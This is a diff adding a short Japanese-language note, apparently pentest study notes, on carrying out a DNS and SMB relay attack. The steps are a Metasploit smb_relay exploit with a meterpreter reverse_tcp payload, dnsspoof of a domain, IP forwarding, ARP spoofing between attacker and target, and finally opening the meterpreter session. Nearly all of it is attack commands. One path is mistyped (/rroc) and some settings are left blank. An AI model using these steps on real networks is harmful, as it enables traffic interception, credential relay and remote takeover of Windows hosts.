@@ -1,0 +1,20 @@
+DNSとSMBリレー攻撃
+1) msfconsole起動する
+2) モジュールを起動して、基本情報の設定を行う
+search relay_smbでモジュールを検索する
+use exploit/windows/smb/smb_relay
+set SRVHOST My_IP
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 
+set SMBHOST
+exploit
+3) echo "My_IP *.sportsfoo.com" > dns
+4) dnsspoof -i eth1 -f dns
+5) echo 1 > /rroc/sys/net/ipv4/ip_forward
+6) 
+arpspoof -i eth1 -t My_IP ターゲットIP
+arpspoof -i eth1 -t ターゲットIP My_IP
+7) セッションを起動する
+sessions
+sessions -i 1
+getuid
